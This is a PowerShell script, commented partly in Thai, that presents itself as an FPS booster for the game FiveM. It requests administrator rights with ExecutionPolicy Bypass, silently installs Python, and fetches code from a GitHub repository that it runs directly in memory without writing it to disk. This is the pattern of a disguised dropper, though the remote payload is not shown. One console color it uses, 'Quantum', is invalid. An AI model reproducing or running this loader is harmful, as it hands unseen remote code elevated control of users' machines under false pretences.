# =========================================================
# FiveM Ultra FPS Booster - In-Memory Execution Script
# =========================================================

# 1. ยกระดับสิทธิ์เป็น Administrator โดยอัตโนมัติ
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Requesting Administrator privileges..." -ForegroundColor Yellow
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/chelseaZZZ1/boostfps/main/run.ps1'))`"" -Verb RunAs
    exit
}

# 2. ตรวจสอบและติดตั้ง Python / PyWebView
if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "[-] Python is not installed. Installing Python via winget..." -ForegroundColor Red
    winget install Python.Python.3.11 --silent --accept-package-agreements --accept-source-agreements
    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

Write-Host "[+] Checking dependencies..." -ForegroundColor Cyan
python -m pip install pywebview --quiet --disable-pip-version-check

# 3. โหลด main.py จาก GitHub มาประมวลผลบน RAM (Memory) โดยตรง
Write-Host "[+] Fetching application code into RAM..." -ForegroundColor Green
$pythonCode = (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/chelseaZZZ1/boostfps/main/main.py')

# 4. ส่งผ่านโค้ดเข้าไปรันใน Python Process ทันที (ไม่เขียนลงดิสก์)
Write-Host "[🚀] Launching FiveM Ultra FPS Booster..." -ForegroundColor Quantum
python -c "$pythonCode"
